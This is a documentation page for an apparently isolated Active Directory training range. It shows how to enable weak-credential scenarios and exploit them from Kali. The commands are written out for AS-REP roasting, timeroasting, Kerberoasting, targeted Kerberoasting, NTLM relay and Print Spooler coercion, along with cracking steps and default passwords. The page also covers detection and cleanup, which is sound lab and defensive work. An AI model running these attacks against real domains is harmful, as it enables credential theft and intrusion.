---
title: AD Vulnerability Scenarios
layout: default
nav_order: 8
---

# AD Vulnerability Scenarios

This page describes the credential-access states provisioned by the local
ThruntOps AD roles and how to exercise them from the lab's Kali VM. These are
manual, post-deployment profiles; they are not enabled by default and are not
part of the range deployment. Run them only in an isolated ThruntOps range.

The project uses hands-on Kali commands and published tool/technique references
for these exercises. It does **not** use Atomic Red Team.

## Apply a scenario to a deployed range

Use the separate CLI from the repository root. It requires the Ludus CLI to be
configured and Python 3 with PyYAML available. Install the Python dependency in
a virtual environment if it is not already present:

```bash
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install -r scripts/requirements.txt
python3 scripts/thruntops-scenarios.py list
python3 scripts/thruntops-scenarios.py --range <range_id> status
python3 scripts/thruntops-scenarios.py --range <range_id> apply
# Or name scenarios directly; ADCS entries include adcs-esc1, adcs-esc10-case1, etc.
python3 scripts/thruntops-scenarios.py --range <range_id> apply asrep adcs-esc1
# Timeroasting is available as: apply timeroasting
```

`apply` presents a menu, previews the selected roles and target VMs, and requires
the operator to type `APPLY`. It registers missing local roles, installs the
upstream `badsectorlabs.ludus_adcs` role at version `1.6.0` when needed, updates
the selected range configuration, then invokes Ludus with `--only-roles` and
`--limit`. It does not call `siem.sh deploy` or destroy/recreate VMs.

The selected roles remain in the range configuration. The CLI does not offer a
disable/reset command: setting a role variable to `false` does not undo changes
already made on Windows, and the upstream ADCS role is explicitly non-idempotent.
Restore a suitable VM snapshot or perform scenario-specific cleanup to return to
baseline. If the role run fails, inspect Ludus logs before retrying; the updated
configuration is kept so the selected state is visible.

## Lab values

Replace `<range>` with the range's subnet number. Kali is `10.<range>.20.250`,
the domain controller is `10.<range>.20.11`, and the workstation is
`10.<range>.20.21`.

```bash
export DC_IP=10.<range>.20.11
export WS_IP=10.<range>.20.21
export KALI_IP=10.<range>.20.250
```

Kali is configured to resolve the domain through the DC. The examples use the
default scenario credentials in the roles; use the values configured for the
profile if they have been changed. The Kali role configures DNS and Kerberos;
it does not install every tool shown below. Check the linked project pages for
installation instructions if a command is unavailable.

## AS-REP roasting

**What it is:** An AD account has Kerberos preauthentication disabled. An
unauthenticated requester can ask the KDC for authentication data and receive a
password-derived response that can be cracked offline. This profile creates
`user.asrep` with preauthentication disabled.

**From Kali:**

```bash
impacket-GetNPUsers -dc-ip "$DC_IP" thruntops.domain/user.asrep -no-pass
```

A successful result includes an AS-REP hash (commonly `$krb5asrep$`). Save it
and test it offline with a password-recovery tool. The default profile password
is `password1`.

**References:** [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) · [The Hacker Recipes: AS-REP roasting](https://www.thehacker.recipes/ad/movement/kerberos/roasting/asreproast)

## Timeroasting

**What it is:** Microsoft's SNTP extension allows an unauthenticated request to
the domain controller to obtain a response authenticated with a computer
account's password hash. This profile creates the enabled computer account
`computer.timeroasting$` with the deliberately weak default password
`password1`. The role sets that password only when the account has no initialized
password, so applying the profile again does not rotate it.

Apply with `python3 scripts/thruntops-scenarios.py --range <range_id> apply timeroasting`.
From Kali, run the standalone Timeroast client against `$DC_IP`, then test its
output offline with Hashcat (mode 31300 is MS-SNTP). Timeroast output identifies
accounts by RID; map the target RID to the computer account in AD when
validating the result.

```bash
python3 timeroast.py "$DC_IP" > timeroast-hashes.txt
hashcat -m 31300 --username timeroast-hashes.txt /usr/share/wordlists/rockyou.txt
```

**References:** [The Hacker Recipes: Timeroasting](https://www.thehacker.recipes/ad/movement/kerberos/roasting/timeroast) · [Timeroast tool](https://github.com/bvcyber/Timeroast)

## Kerberoasting

**What it is:** A domain user with a Service Principal Name (SPN) can have a
Kerberos service ticket requested by an authenticated domain user. The ticket
contains material that can be cracked offline. This profile creates
`svc.backup`, registers an SPN, restricts it to RC4, and grants the account
local administrator rights on the workstation to demonstrate the impact of
recovering its password.

**From Kali:**

```bash
impacket-GetUserSPNs -dc-ip "$DC_IP" -request \
  'thruntops.domain/svc.backup:password1'
```

The output includes a `$krb5tgs$` hash. The default profile password is
`password1`.

**References:** [Impacket GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) · [The Hacker Recipes: Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/roasting/kerberoast)

## Targeted Kerberoasting

**What it is:** A delegated account is allowed to write the `servicePrincipalName`
attribute of a privileged account. The tester uses that permission to assign an
SPN, requests a service ticket, and attempts to crack it offline. This profile
creates `admin.tier0` in Domain Admins with no SPN, then grants `svc.helpdesk`
the narrowly scoped `WriteProperty` permission on that attribute.

**From Kali:** assign a temporary SPN using the delegated account, request its
ticket, then remove the SPN after testing:

```bash
bloodyAD --host "$DC_IP" -d thruntops.domain \
  -u svc.helpdesk -p 'welcome1' \
  msldap addspn 'CN=admin.tier0,CN=Users,DC=thruntops,DC=domain' \
  'http/roast.thruntops.domain'

impacket-GetUserSPNs -dc-ip "$DC_IP" -request \
  'thruntops.domain/svc.helpdesk:welcome1'

bloodyAD --host "$DC_IP" -d thruntops.domain \
  -u svc.helpdesk -p 'welcome1' \
  msldap delspn 'CN=admin.tier0,CN=Users,DC=thruntops,DC=domain' \
  'http/roast.thruntops.domain'
```

Confirm that the ticket output contains a `$krb5tgs$` hash. The default victim
password is `trustno1`; the delegated account password is `welcome1`.

**References:** [BloodyAD User Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide) · [Impacket GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) · [The Hacker Recipes: targeted Kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting)

## NTLM relay

**What it is:** NTLM relay forwards a live NTLM authentication exchange to a
different service instead of cracking the response. Relay is possible when the
target service does not enforce protections such as SMB signing or LDAP signing
and channel binding. The profile creates `user.ntlmrelay`, relaxes LDAP signing
and channel-binding settings on the DC, and stops requiring SMB signing on the
workstation.

**From Kali:** start a relay listener for one target:

```bash
impacket-ntlmrelayx -t "smb://$WS_IP" -smb2support
# Or, in a separate test, target LDAP on the DC:
impacket-ntlmrelayx -t "ldap://$DC_IP"
```

The listener needs a separate, authorized source of incoming NTLM
authentication. This four-node lab does not provision an NTLM coercion source
or trigger, so the commands above alone do not produce a relay. The impact of a
successful relay depends on the rights of the relayed identity; the profile
weakens the protocol protections but does not grant the relayed identity
additional directory permissions. Restart services or the affected Windows
hosts if the registry policy changes have not taken effect.

**References:** [Impacket ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) · [The Hacker Recipes: NTLM relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)

## Authentication coercion (MS-RPRN)

**What it is:** The Print Spooler exposes remote printer RPC methods that can
induce a computer to authenticate to a tester-controlled host. This lab
scenario is an intentional service-configuration weakness: it enables Print
Spooler on the DC and creates the low-privilege `user.coercion` account needed
to invoke the RPC method. It does not depend on exploiting a CVE.

**From Kali:** start a capture or relay listener first, then trigger the DC to
authenticate to Kali. With Responder listening on Kali's lab interface:

```bash
sudo responder -I eth0
```

In a second Kali terminal, run `printerbug.py` from
[dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx):

```bash
python3 printerbug.py \
  "THRUNTOPS/user.coercion:password1@${DC_IP}" \
  "$KALI_IP"
```

The DC should attempt NTLM authentication to Kali; Responder should show the
computer account (`THRUNTOPS$`) rather than `user.coercion`, because the
Spooler service performs the outbound authentication. The machine-account
secret is randomly managed by AD, so this exercise demonstrates coercion and
telemetry, not a crackable password. For a relay exercise, replace Responder
with an appropriate `ntlmrelayx` listener and use only targets inside this lab.

**References:** [krbrelayx printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) · [The Hacker Recipes: MS-RPRN coercion and NTLM relay](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/rpc-coercions/ms-rprn)

## Detection and cleanup

Run one scenario at a time and search the selected SIEM for activity on the DC
and workstation at the time of the test. Kerberos requests and NTLM
authentication should be visible only if the relevant Windows event channels
are being collected. Check the backend guide for its query and data-source
details: [Elastic](elastic.md), [Wazuh](wazuh.md), or [Splunk](splunk.md).

Remove the temporary SPN after the targeted Kerberoasting exercise. To return
the lab to its baseline, remove the scenario identities and restore the LDAP
and SMB signing policy values changed by the NTLM relay profile.
